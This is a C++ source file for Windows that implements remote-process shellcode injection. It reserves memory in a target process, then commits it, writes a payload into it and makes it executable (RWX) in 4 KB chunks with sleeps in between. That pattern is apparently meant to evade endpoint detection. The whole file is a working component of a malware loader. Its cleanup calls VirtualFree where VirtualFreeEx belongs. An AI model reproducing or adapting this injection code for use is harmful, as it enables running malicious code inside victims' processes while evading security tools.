#include <Windows.h>
#include <iostream>
#include <vector>
#include "common.h"


//
// chunked alloc and copy
// takes payload, payload size and handle of process
// returns shellcode address
//
BOOL Inject(PBYTE pbPayload, SIZE_T szPayloadSize, HANDLE hProcess, PVOID &pPayloadAddress)
{

	HANDLE	hThread				= NULL;		// thread handle
	PVOID	pShellcodeAddress	= NULL;		// address of payload
	SIZE_T	szChunkSize			= 0x1000;	// 4096 in decimal
	SIZE_T	szBytesWritten		= 0;		// writeprocessmemory out var
	BOOL	bStatus				= FALSE;	// bool status var
	DWORD	dwOldProtect		= 0;		// old protect value


	//
	// check payload isn't empty
	// 
	if (pbPayload == NULL)
	{
		std::cerr << "[-] Payload is empty" << std::endl;
		return FALSE;
	}


	//
	// reserve mem for entire payload
	//
	SIZE_T szPayloadRounded = (szPayloadSize + 4095) & ~4095;
	pShellcodeAddress = VirtualAllocExNuma(
		hProcess,
		NULL,
		szPayloadSize,
		MEM_RESERVE,
		PAGE_READWRITE,
		0);
	if (pShellcodeAddress == NULL)
	{
		std::cerr << "[-] VirtualAllocEx:\t" << GetLastError() << std::endl;
		return FALSE;
	}
	std::cout << "[+] VirtualAllocEx:\t" << "SUCCESS" << std::endl;


	//
	// commit chunking loop
	//
	for (SIZE_T offset = 0; offset < szPayloadSize; offset += szChunkSize)
	{

		if (!VirtualAllocExNuma(hProcess, (PBYTE)pShellcodeAddress + offset, szChunkSize, MEM_COMMIT, PAGE_READWRITE, 0))
		{
			std::cerr << "[-] VirtualAllocEx Failed:\t" << GetLastError() << " - " << offset << std::endl;
			VirtualFree(
				pShellcodeAddress, 
				0, 
				MEM_RELEASE);
			return FALSE;
		}
		// std::cout << "[*] Allocated:\t\t" << offset << "/" << szPayloadRounded << std::endl;
		Sleep(SLEEP_TIME);
	}
	std::cout << "[+] VirtualAllocEx:\t" << "SUCCESS" << std::endl;


	//
	// payload copy chunk loop
	//
	for (SIZE_T offset = 0; offset < szPayloadSize; offset += szChunkSize)
	{

		SIZE_T szBytesToCopy = min(szChunkSize, szPayloadSize - offset); // prevents copying more bytes than needed
		bStatus = WriteProcessMemory(
			hProcess,
			(PBYTE)pShellcodeAddress + offset,
			pbPayload + offset,
			szBytesToCopy,
			&szBytesWritten);
		if (!bStatus)
		{
			std::cerr << "[-] WriteProcessMemory:\t" << GetLastError() << " - " << offset << std::endl;
			VirtualFree(
				pShellcodeAddress, 
				0, 
				MEM_RELEASE); // Clean up before returning
			return FALSE;
		}
		// std::cout << "[*] Written:\t\t" << offset + szBytesWritten << "/" << szPayloadSize << std::endl;
		Sleep(SLEEP_TIME);
	}
	std::cout << "[+] WriteProcessMemory:\tSUCCESS" << std::endl;


	//
	// execute permission chunk loop
	//
	for (SIZE_T offset = 0; offset < szPayloadSize; offset += szChunkSize)
	{
		SIZE_T szProtectSize = min(szChunkSize, szPayloadSize - offset);  // handle last chunk
		bStatus = VirtualProtectEx(
			hProcess,
			(PBYTE)pShellcodeAddress + offset,
			szProtectSize,
			PAGE_EXECUTE_READWRITE,
			&dwOldProtect);
		if (!bStatus)
		{
			std::cerr << "[-] VirtualProtectEx:\t" << GetLastError() << " - " << offset << std::endl;
			VirtualFree(
				pShellcodeAddress,
				0,
				MEM_RELEASE);
			return FALSE;
		}
		// std::cout << "[*] Protected:\t\t" << offset << "/" << szPayloadRounded << std::endl;
		Sleep(SLEEP_TIME);
	}
	std::cout << "[+] VirtualProtectEx:\t" << "SUCCESS" << std::endl;


	//
	// return
	//
	pPayloadAddress = pShellcodeAddress;

	return TRUE;

}